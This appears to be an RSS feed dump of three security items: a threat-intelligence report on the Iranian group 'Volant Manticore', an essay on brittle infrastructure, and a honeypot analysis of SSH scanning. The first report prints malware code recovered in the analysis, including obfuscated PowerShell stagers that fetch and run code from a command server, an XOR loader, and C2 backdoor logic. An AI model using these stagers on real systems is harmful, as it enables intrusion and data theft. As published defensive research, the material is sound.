item.title: Volant Manticore: Flying Under the Radar
item.description:
Key Points Introduction Check Point Research is tracking a previously undocumented Iran-nexus threat group who we named Volant Manticore. What started in July 2026 as a single backdoor delivered to a Cyprus-based airline through a fake CV has since expanded into a broader cluster of activity that we traced back to September 2025. MuddyWater is […]

The post Volant Manticore: Flying Under the Radar appeared first on Check Point Research.
item.content:encoded:
Key Points

  • Check Point Research identified Volant Manticore, a previously undocumented Iranian threat group linked to Iran’s Ministry of Intelligence and Security (MOIS). Based on our observations, we believe this is the first Iranian group to designate Cyprus as a primary espionage target, focusing on telecommunications companies, airlines, and critical infrastructure.
  • The group uses KuboShell, a new backdoor that utilizes IPFS for command-and-control (C2) functions, to deploy the Homa Framework, a post-compromise framework built on a reimplementation of MuddyWater’s MuddyC2Go client. Alongside custom malware, Volant Manticore delivers RMM tools and runs credential-harvesting campaigns.
  • Further analysis shed light on the operators’ internal setup, including development, testing, and operational environments, both on-premise and in the cloud. We observed the group testing their tooling against antivirus products before deployment, as well as using Fortinet SSL VPN clients which suggests access to the victims’ networks via VPN.
  • While we identified multiple links to MuddyWater, we assess that Volant Manticore likely consists of former MuddyWater operators who branched off from the group and currently operate as a separate threat cluster.
  • Volant Manticore’s targeting priorities appear responsive to regional geopolitical developments. A recent shift toward Saudi Arabian targets, including the healthcare sector, may reflect the escalating tensions between Saudi Arabia and the Iranian-backed Houthis.

Introduction

Check Point Research is tracking a previously undocumented Iran-nexus threat group who we named Volant Manticore. What started in July 2026 as a single backdoor delivered to a Cyprus-based airline through a fake CV has since expanded into a broader cluster of activity that we traced back to September 2025.

MuddyWater is an Iranian espionage group linked to the Ministry of Intelligence and Security (MOIS), focusing primarily on espionage and active since at least 2017. Volant Manticore shares tooling and tradecraft with MuddyWater, but their narrow regional focus, custom implants, and distinct TTPs (Tactics, Techniques, and Procedures) set it apart.

Cyprus is at the center of Volant Manticore’s operations. The island’s deepening defensive and energy ties with Israel and Greece, and its role as a hub for Western military operations in the region, make it a natural target for Iranian intelligence collection. Cyprus was among the countries where we observed a rise in Iran-nexus targeting of IP cameras starting February 28, 2026, activity that may precede military strikes as well as support post-battle damage assessment. The group’s focus on the island’s telecommunications companies and airlines is consistent with Iran’s history of operational activity against individuals in Cyprus.

In September 2026, coinciding with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis, we observed Volant Manticore abruptly shifting their attention to Saudi Arabia and targeting healthcare organizations. This fits the MOIS’s track record of targeting hospitals and healthcare providers through cyber operations during military conflicts, in some cases attempting to disrupt their operations.

In this report, we analyze the KuboShell backdoor and the Homa Framework, map Volant Manticore’s wider infrastructure, and analyze an earlier campaign against a likely Cypriot government target. We also cover the group’s recent turn toward Saudi Arabia and present evidence for our attribution.

Delivery Method: Meet Athena Marinou

Our investigation started when we identified on Virus Total a fake CV belonging to “Athena Marinou”, an AI-generated travel and tourism professional based in Cyprus. The file invites the reader to download the full CV from a legitimate jobs and recruitment website, but the hyperlink behind that text actually points to an archive hosted at Catbox, which delivers the KuboShell Backdoor to the victim’s system. We assess this phishing attempt was aimed at a Cyprus-based airline whose business centers on flights between Cyprus and Israel.

In late September this year, Volant Manticore launched a phishing campaign against Saudi targets, delivering KuboShell through an archive named AI_Healthcare_Seminar.zip. Similar to the initial sample we identified, this variant also masqueraded as PDF-related software.

We also identified a related archive, Ai_Healthcare_Seminar_Online.zip, which we assess targeted the same organization. Instead of KuboShell, it contains an N-able RMM executable. The email account associated with the sample belongs to a private hospital in Saudi Arabia, and was likely compromised using leaked credentials. Together with the different healthcare-themed lure names we observed, this suggests Volant Manticore specifically targeted the Saudi healthcare sector.

KuboShell – IPFS as a Command-and-Control Channel

KuboShell is a 64-bit Windows backdoor that uses the InterPlanetary File System (IPFS) for command-and-control (C2) communication. IPFS is a peer-to-peer file-sharing network that identifies each file by its content hash instead of its location. Because files remain available only while some node stores(“pins”) them, KuboShell relies on Pinata, a commercial pinning service that provides an API for uploading and retrieving files on IPFS. Kubo, referenced in the backdoor’s PDB path, is the original implementation of IPFS.

On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt.

KuboShell retrieves the MAC address of the machine’s first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\Users\Public\<MAC>.log, using a hard-coded Pinata access token.

After it’s registered, KuboShell checks Pinata for a command file named <MAC>.txt. If this file exists, KuboShell looks up the file’s IPFS identifier and downloads its contents through Pinata’s public gateway.

The downloaded text is passed to PowerShell in a hidden window. After execution completes, KuboShell attempts to upload C:\Users\Public\<MAC>re.txt, where the command is expected to write its results. KuboShell does not capture the output itself, so results are returned only if the received command writes them to that file. KuboShell then checks for a new command every 60 seconds.

Whacking the Piñata

We analyzed the historical commands issued by the operator and the command output across a time period spanning from May to October 2026, including operator testing conducted during the two months before the first observed phishing attempt.

Based on the operator commands, KuboShell appears to serve as an initial foothold for executing basic reconnaissance commands, particularly quser, whoami, and ipconfig, before downloading and executing a more capable backdoor through a multi-stage PowerShell and JavaScript execution chain. KuboShell therefore appears to function as a “guardrail”, allowing the operators to assess the compromised environment before deploying the final payload, consistent with phishing-based initial access.

In addition to reconnaissance and commands used to retrieve the next stage, the command history includes:

list
payload
persist
Get-Variable
route print
net group "domain admins" /domain
nslookup -q=srv _kerberos._tcp
ping 10.40.0.174 -n 2 -a
netstat -nat
Invoke-WebRequest -Uri 'hxxps://remote.medochomie[.]com/api/ClientDownloads/WindowsInstaller/0f3db892-22d4-4479-a7ec-e54a375bd19c' -OutFile "${env:TEMP}\Install-Remotely.ps1" -UseBasicParsing; Start-Process -FilePath 'powershell.exe' -ArgumentList ("-executionpolicy", "bypass", "-f", "${env:TEMP}\Install-Remotely.ps1") -Verb RunAs;

Right Commands, Wrong Console

The operators sent list, persist, and payload commands to KuboShell, though none of them is a valid PowerShell command. These apparent “mistakes” suggest the operators entered built-in framework commands into the wrong console, which is consistent with the theory that the operators used a modular framework layered on top of the relatively simple JavaScript backdoor that acts as the final stage of this infection chain. As we discuss later in this section, the JavaScript backdoor exhibits links to MuddyWater tooling. Notably, all three commands sent by the operators are known commands in MuddyWater’s dedicated C2 frameworks, such as PhonyC2. This further supports the idea that the backdoor functions as the core module executor within a broader framework – which Check Point Research tracks as the Homa Framework.

Post-Compromise Payloads – The Homa Framework

From the operator commands, we were able to identify the next-stage payloads. We call this multi-stage post-compromise framework the Homa Framework.

Stage 1 – PowerShell Stager

The first stage is a simple PowerShell command that requests a payload from a hard-coded IP address, 185.205.187[.]109:8000, using a unique URI path assigned to each new client. It then reads the response and executes it in memory.

$uri ="http://185.205.187[.]109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content

To bypass static analysis and evade signature-based detection, the operators appear to have experimented with different techniques to hide command execution, such as extracting character slices from system paths or default PowerShell preference variables like SpecialFolders[‘AllUsersStartUp’]and $PSSessionConfigurationName, to dynamically build execution triggers such as iex.

$uri ="http://"+"185"+"."+"205"+"."+"187"+"."+"109"+":8000/{UID}";$req = [System.Net.WebRequest]::Create($uri);$rgr = '$re' + 'q.GetRe' + 'sponse()';$res = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rgr;$rger = '$res.GetR' + 'espon' + 'seStream()'; $strm = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rger ;$reader = New-Object System.IO.StreamReader($strm);$content = $reader.ReadToEnd(); .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $content

Stage 2 – PowerShell Loader

The second stage PowerShell script decodes an encoded string using a defined Xor-Decode function. It removes newline characters and processes the input in three-character numeric chunks. The resulting value is passed to Add-Type with the JavaScript language option, after which the script attempts to invoke a static run() method. A while($true) loop repeatedly executes this logic, with exception handling that retries compilation under an alternative type name.

function Xor-Decode {
    param ([string]$EncodedText)

    $key = [int][char]'o'
    $result = ""

    $clean = ($EncodedText -replace "`r|`n", "")

    for ($i = 0; $i -lt $clean.Length; $i += 3) {
        $num = [int]$clean.Substring($i, 3)
        $result += [char]($num -bxor $key)
    }

    return $result
}

$src = "079079079079028027014027006012..."

$dec = Xor-Decode $src
while($true) {
    try {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1]
        $jsc::run()
    }
    catch {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc36')[1]
        $jsc::run()
    }
}

Stage 3 – JavaScript Backdoor

The backdoor implements a continuous C2 loop. It sends an initial hi message to hxxp://185.205.187[.]109:8000/X{key}, where key is a five-character alphanumeric hard-coded identifier populated per victim to act as a unique identifier. It communicates using the WinHttp.WinHttpRequest.5.1 COM object, which the server-side component checks for its default User-Agent string when handling incoming requests. The server’s response is interpreted as a command.

static function httppost(content, key) {
	   try
	   {
			var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
			var url = "http://185.205.187[.]109:8000/X" + key;
			var data = content + "()" + key;
			objHTTP.Open("POST", url, false);
			objHTTP.Send(data);
			var res = objHTTP.responseText;
			res = res.slice(1, -1);

			return res;
	   }
	   ...
}

static function run() {
		...        
	  while(true) 
	  {
			...
			  var cmd = httppost("hi", key);
			  if (cmd.length > 2) {
			      result = ex(cmd);
			  }
			...
				if(result.length > 2) {
			      result = httppost(result, key); 
        }
        sleep();
		}
}

The backdoor executes received commands according to their prefix:

  • PowerShell commands: Commands beginning with function are executed through hidden PowerShell with execution-policy bypass.
  • SSH commands: Commands beginning with ssh are launched asynchronously through cmd.exe, likely so that long-running SSH sessions, such as tunnels, won’t block the polling loop.
  • Other commands: Executed through cmd.exe /c, with standard output redirected to C:\Users\Public\outputt2.txt.

The backdoor reads the command output from the temporary file, strips non-printable characters and blank lines, and then deletes the file. Any output that’s produced is sent back to the C2 server using an HTTP POST request. The loop pauses for ten seconds between iterations.

We assess that the third-stage backdoor is designed, at least in part, to execute additional modules which we were unable to recover.

Code Similarities with MuddyWater

The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework:

  • The same payload-delivery URI pattern: H followed by a 32 alphanumeric characters identifier
  • The same POST request format:
    • URI: X followed by a 5-character alphanumeric key.
    • Content is sent in the format ‘{content}(){key}’.
  • hi as the initial request’s content
  • Similar variable and function names as well as overall script structure

We assess that Homa’s client is a JavaScript reimplementation of the older MuddyC2Go client, potentially allowing Volant Manticore to retain the more complex server-side component with minimal modifications, thereby reducing development time and resources.

Operator Testing and Operational Environments

Volant Manticore operators tested KuboShell on their own machines, partially exposing their testing and development environments. MAC address prefixes and network adapter details indicate the use of both VirtualBox and VMware guests. Several VMware guests shared both a NAT subnet and a gateway. As VMware assigns this subnet per installation, these guests were likely running on the same host. Overall, we identified at least two distinct VMware environments in addition to the VirtualBox environment.

Taken together, the evidence suggests that at least two operators were engaging with the same Pinata account. One, whom we assess to be KuboShell’s developer, used a VirtualBox environment. The other operator primarily used VMware environments and appears to have been more directly involved in carrying out the campaign, including testing ahead of operational activity.

Some of these VMs also had VPN-related virtual adapters installed:

  • Multiple VMs with Fortinet SSL VPN.
  • An IVPN adapter on a VirtualBox guest that also had Fortinet adapters.
  • A VPN adapter associated with Kaspersky on a VMware guest.

The use of the IVPN adapter, a commercial privacy VPN, alongside a Fortinet adapter suggests that the VM might also be used operationally in addition to testing. The Fortinet adapters could indicate that the operators use enterprise VPN connections to access victim environments.

Like IVPN, the Kaspersky antivirus adapter can also provide a privacy VPN. However, because this VPN component can be bundled with the antivirus software, we consider it more likely that it reflects an antivirus installation on a machine used to test tooling against that product.

In addition, we identified a separate cluster of VMs with Azure-associated configuration that may also represent actor-controlled testing infrastructure. Within the command history, explicit Active Directory discovery commands were limited to this cluster. We suspect Volant Manticore used these VMs to test AD-related functionality in a prepared environment.

Mapping Additional Infrastructure

Pivoting on KuboShell’s developer path led us to a NetLock RMM installer uploaded from Saudi Arabia in September 2026. It communicates with nl-backend[.]cnpcyprus[.]net.

C:\Users\code\source\repos\NetLock-RMM\NetLock RMM Agent Installer\bin\Release\net8.0\win-x64\native\NetLock_RMM_Agent_Installer.pdb

Passive DNS records and registration patterns revealed a broader cluster of Cyprus-themed domains:

The subdomains (shown below) suggest the infrastructure serves two purposes: The first is managing RMM tools, initially, MeshCentral and more recently, NetLock RMM. The second is credential harvesting: combined with a GoPhish service observed on one of the servers, the email-themed subdomains suggest phishing campaigns aimed at the email and corporate credentials of at least some of the impersonated organizations.

January 2026: Military-Themed Lure Likely Targeting a Cypriot Government Entity

The observed Homa Framework C2 was 185.205.187[.]109, but the operator commands revealed the actor also used 185.205.187[.]107 in August. This suggests several adjacent addresses were provisioned together. The “missing” address in the series, 185.205.187[.]108, led us to an earlier campaign.

In January 2026, a malicious Word document named MilitaryHeritageProposal.doc was uploaded to VirusTotal from Cyprus. It shows a blurred page and asks the reader to enable content to see it. We assess the phishing attempt was likely aimed at a Cypriot government entity. The military theme may indicate the target is related to the defense sector.

The document hides a VBA backdoor in its macros. Enabling the content triggers execution through one of two paths: one fires shortly after a fake “Microsoft Word is not responding” error message is shown, and the other one fires if the victim closes the document in response. Ahead of running the second stage, the macros set HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM to 1, granting programmatic access to the VBA project. It then opens a hidden Word instance, rebuilds the second-stage code from hundreds of encoded fragments, and injects it into that instance.

After the second stage runs, every other WINWORD.EXE process, including the one hosting the original document, is terminated. To the victim, Word simply appears to have crashed, and only the hidden instance survives. The backdoor then generates a random 10-character victim ID and registers with the C2 at 185.205.187[.]108:25498 over plain HTTP. From there it loops: check for a file to download, wait 20 seconds, poll for a command, wait another 20 seconds.

The backdoor handles each command by its prefix:

  • Commands that start with $uri or $req run through hidden PowerShell. These same variables were present in the Homa Framework first-stagers we observed earlier. This branch therefore appears to exist specifically to deliver follow-up payloads, possibly related to Homa. Two more clues support this:
    • Unlike the cmd.exe path, the PowerShell branch does not send its output back to the C2.
    • The VBA backdoor has no persistence mechanism of its own.
  • Other commands run through cmd /c, with output captured to C:\ProgramData\UiAutomation.txt, read back, deleted, and sent to the C2 as a JSON-formatted result.

Downloaded files arrive in sequential fragments, which the backdoor reassembles and saves to C:\Users\Public under a filename the C2 supplies in the X-Filename HTTP response header.

Related Infrastructure

185.205.187[.]108 hosted corenewsnetwork[.]com from November to December 2025, and also briefly hosted liveupdatenews[.]net. Both are generic news-themed domains and also resolved to 185.106.102[.]70 in November 2025. In January 2026, the following URL was scanned on VirusTotal:

hxxp://185.106.102[.]70:8080/HK5PpjU6I9ug0zmNZqAFdIPa9wayXl2RZ

This URL follows the same pattern as the Homa Framework’s first-stage URLs, which corroborates both the passive DNS pivots and our original pivot to 185.205.187[.]108. The timeline matches as well: the document’s metadata shows it was created on January 26 and last saved on January 27, 2026, the same day the URL was scanned.

Eyes on the Kingdom: Shifting Focus Towards Saudi Arabia

Volant Manticore began targeting Saudi entities in September 2026. In contrast to their earlier, narrowly targeted campaigns in Cyprus, we observed a sudden spike in the group’s phishing activity against Saudi organizations, with a seeming focus on the healthcare sector. We assess that this shift may indicate that the operators were tasked, with short notice, to rapidly gain access to Saudi targets:

  • Spray-and-pray – Phishing activity delivering NetLock RMM increased significantly, and its targeting appears to have broadened within Saudi Arabia. Several samples used generic lure names such as “WhatsApp Images” or “Excel Online”, suggesting a wider pool of recipients rather than specific organizations. Other samples retained Saudi-themed names, such as Madinati-Platform.exe and برنامج الاعتماد المشترك في السياحة العلاجية.exe (“Joint Accreditation Program in Medical Tourism”). As mentioned above, in one case Volant Manticore appears to have sent the same target two similar phishing lures in quick succession, one delivering KuboShell and the other N-able RMM, which may be an effort to gain a foothold by any means.
  • Rushed development – The KuboShell sample targeting Saudi Arabia contained leftover debug strings absent from the previously observed sample, suggesting it was compiled and deployed in a hurry.
  • Repurposed infrastructure – The group used the overtly Cyprus-themed domain cnpcyprus[.]net as C2 for NetLock RMM samples used against Saudi targets. This is consistent with a rapid shift in targeting before the dedicated infrastructure was in place.
  • Geo-matched hosting – Even though they didn’t register a new domain, on October 11, Volant Manticore re-routed the existing domain to a newly provisioned Saudi-based HostZealot VPS at 185.253.118[.]221. This is consistent with the group’s observed pattern of using victim-facing C2 infrastructure within the targeted country, and further strengthens our hypothesis that, while Volant Manticore intended to rotate old infrastructure, they simply didn’t manage to do so in time. While configuring the new VPS, the operators also exposed an open directory at its root – an apparent operational security (OPSEC) slip that may reflect hurried deployment.

One possible explanation for this apparent shift in targeting priorities is the escalating conflict involving Saudi Arabia and the Iranian-backed Houthis. The departure from the group’s earlier tailored spear-phishing supports two possible explanations. Volant Manticore’s handlers may have prioritized gaining access to a broader set of Saudi organizations over selectively targeting specific entities, or the operators were pushing hard to compromise these targets and sent them multiple lures within a short period, or both. Based on the available evidence, we cannot determine which is the likelier explanation.

Attribution

We assess with high confidence that Volant Manticore is an Iran-nexus threat group, and with medium confidence that it is at least historically linked to Iran’s Ministry of Intelligence and Security (MOIS). However, Iran’s cyber ecosystem is fluid, and the boundaries between the organizations engaged in such activity are not always clear-cut. We therefore cannot rule out that Volant Manticore now operates under a different Iranian entity.

Our assessment is based on these findings:

  • Working patterns – Timestamps of the operators’ activity align with working hours in Iran’s local time (UTC+3:30). The observed workweek also fits a Thursday–Friday weekend.
  • PDB path – The PDB path of the KuboShell sample uploaded from Saudi Arabia includes the directory F:\homa\. In Persian mythology, Homa is a mythical bird associated with good fortune and freedom.
  • Target scope – Saudi Arabia has long been a key target of Iranian cyber espionage operations. As we discussed in the Introduction section, Cyprus also fits within Iran’s regional targeting priorities.

Overlaps With MuddyWater

We identified several overlaps between Volant Manticore and MuddyWater, including:

  • Code similarities – The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework, as we mentioned above.
  • TTPs – Both groups pair RMM tools with malicious documents in spear-phishing campaigns, and both have been tied to using compromised email accounts to register with RMM providers.
  • Matching server setup – Volant Manticore’s server at 185.253.118[.]221 and MuddyWater’s server at 159.198.36[.]115 both hosted a Python SimpleHTTPServer open-directory on port 4444.

For a deeper discussion of the attribution, see Appendix 1.

Conclusion

Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself. What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention.

Distinguishing Volant Manticore from MuddyWater is crucial. While the two groups currently share part of their tradecraft, we expect Volant Manticore to keep developing its own tooling and TTPs, and the differences between the two groups will become more pronounced over time. Treating Volant Manticore as part of MuddyWater could therefore lead to blind spots, particularly for organizations in Saudi Arabia and Cyprus.

Cyprus appeared to be Volant Manticore’s primary focus, which makes sense considering the island’s increasing alignment with Iran’s adversaries. In September 2026, however, this pattern changed abruptly. As the conflict between Saudi Arabia and the Houthis escalated, Volant Manticore pivoted to an intensified campaign against Saudi organizations before its tooling and infrastructure were fully ready.

We believe Volant Manticore will continue operating against Saudi Arabia as long as the conflict with the Houthis keeps escalating. Meanwhile, Cyprus will likely still remain a consistent target. More broadly, we expect Volant Manticore to remain responsive to geopolitical developments, potentially shifting its targeting priorities in the event of major changes in the regional situation.

Appendix 1 – Distinct Actors, Shared Roots?

Given our assessment that Volant Manticore is composed of former MuddyWater operators, we want to be transparent about our reasoning that led us to this conclusion. Considering the observed overlaps and the fluid nature of Iran’s threat landscape, we weighed several competing hypotheses:

  • Same actor – Volant Manticore and MuddyWater are the same group, or Volant Manticore is a subgroup operating within MuddyWater under specific tasking.
  • Spin-off – Volant Manticore comprises former MuddyWater operators who left individually or branched off together as a subgroup.
  • Professional ties – Operators of the two groups maintain formal or informal professional relationships.
  • Shared training – Operators of both groups share a common training background.
  • Shared developer – Both groups rely on a common developer, either an individual or a digital quartermaster.
  • Copycat – Volant Manticore imitates MuddyWater tooling and TTPs to create the appearance of an Iranian nexus.

Weighing the Alternatives

Volant Manticore relies on an older MuddyWater C2 framework, which MuddyWater has since replaced. A subgroup operating within MuddyWater would most likely have access to the group’s current tooling, making the same-actor hypothesis less likely. Similarly, a copycat would most likely imitate MuddyWater’s latest documented tooling, not a retired framework. Volant Manticore’s new custom implants, which serve as “guardrails” for Homa, make this scenario even less likely.

A shared developer could explain the tooling overlaps, but not the operational ones. While such a developer would likely have access to newer frameworks, Homa reimplements the older MuddyC2Go client and keeps its C2 protocol unchanged. This was likely done to evade existing detections with minimal development effort, leaving the server-side component untouched. Combined with our assessment that KuboShell was built by a single developer, this points to a small group with limited development resources, unlike the developers behind MuddyWater’s frameworks who replaced their tooling over time, most notably after public disclosures.

As for professional ties and shared training, key MuddyWater figures were previously linked to Ravin Academy, described as a talent pipeline for MOIS. Such ties could result in both a common training background and professional relationships between otherwise distinct groups. In fact, MuddyWater’s TTPs have previously overlapped with those of other Iranian actors. Most recently, Proofpoint identified shared TTPs between TA450 (MuddyWater) and UNK_SmudgedSerpent, which Check Point tracks as Nimbus Manticore.

However, both explanations seem less likely in our case. If shared training through Ravin explained the overlaps, we would expect the tooling and TTPs Volant Manticore shares with MuddyWater to be common across Iranian groups. In our observation, they are primarily associated with MuddyWater. As for professional ties, they could explain the UNK_SmudgedSerpent overlaps, which may reflect a one-off collaboration. Volant Manticore, by contrast, has relied on MuddyWater tooling and TTPs consistently over time. This consistency is better explained by habits formed over years of operating within MuddyWater than by occasional collaboration between two separate threat actors. We also observed no signs of operational cooperation that would indicate ongoing contact, such as common targeting or hand-offs.

Why We Favor the Spin-off Hypothesis

  • Legacy tradecraft – Volant Manticore relies on an older MuddyWater framework and exhibits old MuddyWater TTPs. Both point to a close relationship with the group in the past. If that relationship continued, we would’ve expected the operators to have access to MuddyWater’s newer tooling. Instead, they reimplemented a framework they likely obtained while still part of the group.
  • Gradual divergence – Over time, Volant Manticore has moved beyond this legacy tradecraft. It built its own tooling and adapted its TTPs, adding methods such as credential-harvesting campaigns that set it apart from MuddyWater operations. This progression fits a group that started out relying on MuddyWater’s playbook and is gradually forming an identity of its own.
  • Distinct targeting – Volant Manticore’s persistent focus on Cyprus does not match MuddyWater’s targeting patterns. MuddyWater has occasionally targeted Cypriot entities, but its operations typically span multiple countries and shift over time. While Volant Manticore was targeting Cyprus, MuddyWater’s campaigns focused on other regions. This sustained single-country focus suggests Volant Manticore pursues its own goals and priorities.
  • Separate infrastructure – Volant Manticore relies on hosting providers and registrars that are not typically used by MuddyWater. It also appears to manage a smaller infrastructure footprint at any given time, which is more consistent with a small team.

Considering all of the above, we assess with medium confidence that Volant Manticore is a separate, independent group composed of former MuddyWater operators who left either individually or as a group. These operators may retain ties to current MuddyWater members, but we assess that the observed overlaps primarily reflect their shared operational history rather than ongoing collaboration.

Tracing the Split

If MuddyC2Go is the latest MuddyWater framework Volant Manticore’s operators had access to, the split may have happened around 2023 as MuddyWater replaced MuddyC2Go with DarkBeatC2 in late 2023. We could only trace Volant Manticore’s infrastructure back to 2025, which leaves a visibility gap in between.

In addition to tooling, Volant Manticore’s operators may have appropriated MuddyWater’s work environment. The username pc, which appears in the lure document’s metadata, was previously associated with MuddyWater’s phishing activity and malware development. While generic usernames usually carry limited weight on their own, we found the same username across several of Volant Manticore’s VMs. One possible explanation is that the operators are reusing VM images previously used by MuddyWater.

Indicators of Compromise

Files

Network

The post Volant Manticore: Flying Under the Radar appeared first on Check Point Research.

item.title: We Get the Infrastructure We Pay For
item.description:
This essay originally appeared as part of a round table in The Free Press entitled “Is America’s Infrastructure Under Attack?”

Microsoft, the FAA, banks, United Airlines, the NSA—it’s been a really bad week in cyberspace. But, amazing as it might seem, these are not related. As far as we know, they’re not the result of cyberattacks. They’re not even related to AI. (Well, that’s mostly true. The NSA will probably never tell us what went wrong.) It’s really just a series of unfortunate coincidences.

Our computerized infrastructure is vulnerable and fragile. Much of it is old, and has been incrementally patched and upgraded. A surprising amount of it is maintained by hobbyists, without any recompense. And more and more of it is centralized: the same systems affecting many different aspects of our lives and society. In many cases, it just barely works. And when it fails, it tends to fail badly...
item.content:encoded:
This essay originally appeared as part of a round table in The Free Press entitled “Is America’s Infrastructure Under Attack?”

Microsoft, the FAA, banks, United Airlines, the NSA—it’s been a really bad week in cyberspace. But, amazing as it might seem, these are not related. As far as we know, they’re not the result of cyberattacks. They’re not even related to AI. (Well, that’s mostly true. The NSA will probably never tell us what went wrong.) It’s really just a series of unfortunate coincidences.

Our computerized infrastructure is vulnerable and fragile. Much of it is old, and has been incrementally patched and upgraded. A surprising amount of it is maintained by hobbyists, without any recompense. And more and more of it is centralized: the same systems affecting many different aspects of our lives and society. In many cases, it just barely works. And when it fails, it tends to fail badly.

There are a lot of technological reasons why this is true, but they are all downstream of the economic ones. The technologies we rely on are built and maintained within our economic system—and that’s where the core problem lies.

Security, safety, resilience, redundancy, recoverability—these are all essential parts of reliable technology, but they are all costs.

More importantly, they are inefficient: costs that feel wasteful until something bad happens. Modern shareholder capitalism, and private equity in particular, squeeze all inefficiencies out of a company in pursuit of near-term profits. Competition, with multiple companies competing to do the same thing, is another inefficiency. Monopolization removes that in pursuit of near-term profits.

The result is brittle systems, single points of failure. They’re more susceptible to cyberattack—both human and AI-fueled—and more susceptible to random mistakes. The more we allow unregulated capitalism to privatize gains while socializing risks, the more we should expect these sorts of failures.

Fixing this is technical, but it’s political first. It requires changing incentives, and that involves regulation and control. “What to do” is easy; finding the political will to stand up to moneyed interests and do it is hard.

item.title: Scanning from Subnet 109.160.32.0/24, (Mon, Nov 23rd)
item.description: This subnet is assigned to a web hosting and virtual private server (VPS) provider BANATSYNC SRL with AS198364, located in Timisoara, Romania. This graph shows the DShield sensor activity over the past 90 days for this subnet and it is still ongoing as of this writing.
item.content:encoded:
This subnet is assigned to a web hosting and virtual private server (VPS) provider BANATSYNC SRL with AS198364, located in Timisoara, Romania. This graph shows the DShield sensor activity over the past 90 days for this subnet and it is still ongoing as of this writing.

Using the ES|QL query listed below, starting the query from the 1 September 2026, 159 IPs from this block scanned at least once to multiple times my DShield sensors against mostly the SSH service and when found, attempted and sometimes successfully login the sensor. This analysis from this subnet started on the 5 September 2026 and capture regularly by 2 separate DShield sensors. 

A review of both the firewall and cowrie logs, all IPs involved attempted to login into the SSH service with almost all (152 out 159) of them succeeding to login into the sensors using with the standard usernames (root, ubuntu, admin, etc.) using a single command (uname -s -v -n -r -m) followed by a immediate disconnection. One sensor received 127 unique IPs while the other received 134 unique IPs. 

The firewall logs show some interesting characteristics with a time-to-live mostly between 45 to 52 with some exception that also include ranges between 232 to 243. In order to understand the discrepancies, I reviewed the packet capture from each sensor and found some packets where 69 IPs stared with a static IPID of 54321 and every one of them had a TTL that range between 232 to 243. All the inbound backets behaved the same way, SYN, SYN-ACK, RST targeting various ports including TCP/2323, TCP/22 and TCP/2222 where the actors/bots sometimes after multiple attemps, successfully login.

Using the logs from the DShield SIEM and selecting only the traffic with the IPID 54321 and reviewing the Vega-Lite graph, it is easy to see the activity was consistent with the previously identified 69 IPs that each time each IP would come live, the first packet was always starting with high TTL (230+) and the remainder packets were all using normal TTL related to a moderl Linux system. In order to inspect why this would be happening, using packet capture by the sensors based on matching high TTL for one specific IP address (109.160.32.146) and what appeared was interesting. Using tshark to replay the initial packet for 13 Nov 2026 started with a TTL of 239 and when that traffic responded with a reset (0x0004), the TTL was now 50. Any traffic that followed the first SYN packets all had TTL of 50 (picture below). 

This is a sample of 4 IPs (DSL query below) out of the 69 that shows the first packet starting with a TTL 230+ followed by normal TTL after the activity continue. Reviewing  the reports from VirusTotal of those 4 IPs [7][8][9][10] shows all the same characteristics with SSH brute-force if SSH is listening and running some commands before disconnecting.

Shodan Open Ports
This is a random list of IPs checked against Shodan that list the same open ports. The two sample lists show these IPs have SSH available as the only service while other have nothing open. If the SSH service is listening, it is using 2 different version of Ubuntu 24.04 LTS and 26.04 LTS.

Shodan Information about SSH TCP/22

109.160.32.34  SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2 (Ubuntu 26.04 LTS)
109.160.32.141 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13   (Ubuntu 24.04 LTS)
109.160.32.147 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13   (Ubuntu 24.04 LTS)
109.160.32.150 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13   (Ubuntu 24.04 LTS)
109.160.32.200 SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2 (Ubuntu 26.04 LTS)

Shodan No Open Port for this IP sample

109.160.32.12
109.160.32.66
109.160.32.80
109.160.32.88

Kibana Traffic Analysis with DSL and ES|QL

DSL Query IP Range

{
  "range": {
    "related.ip": {
      "gte": "109.160.32.0",
      "lte": "109.160.32.255"
    }
  }
}

DSL Query for IP with a TTL Greater than 230

{
  "range": {
    "network.ttl": {
      "gte": "230"
    }
  }
}

DSL Query IP with Low & High TTL

{
  "terms": {
    "related.ip": [
      "109.160.32.88",
      "109.160.32.141",
      "109.160.32.147",
      "109.160.32.150"
    ]
  }
}

ES|QL Query

FROM cowrie* 
| WHERE event.reference == "no match"
| WHERE CIDR_MATCH(related.ip, "109.160.32.0/24")
| STATS  BY related.ip

FROM cowrie* 
| WHERE event.reference == "no match"
| WHERE CIDR_MATCH(related.ip, "109.160.32.0/24")
| WHERE network.ttl >= 230
| STATS  BY network.ttl

TShark Output

This is the command used to verify the activity between low and high TTL:

tshark.exe -nnr tcp2323_54321_random.pcap -T fields -e frame.time -e ip.src -e ip.dst -e ip.ttl -e tcp.flags

[1] https://scamalytics.com
[2] https://arxiv.org/html/2307.08490v1
[3] https://github.com/zmap/zmap
[4] https://github.com/zmap/zmap/blob/main/src/probe_modules/packet.c
[5] https://isc.sans.edu/tools/honeypot/
[6] https://github.com/bruneaug/DShield-SIEM/tree/main
[7] https://www.virustotal.com/gui/ip-address/109.160.32.88
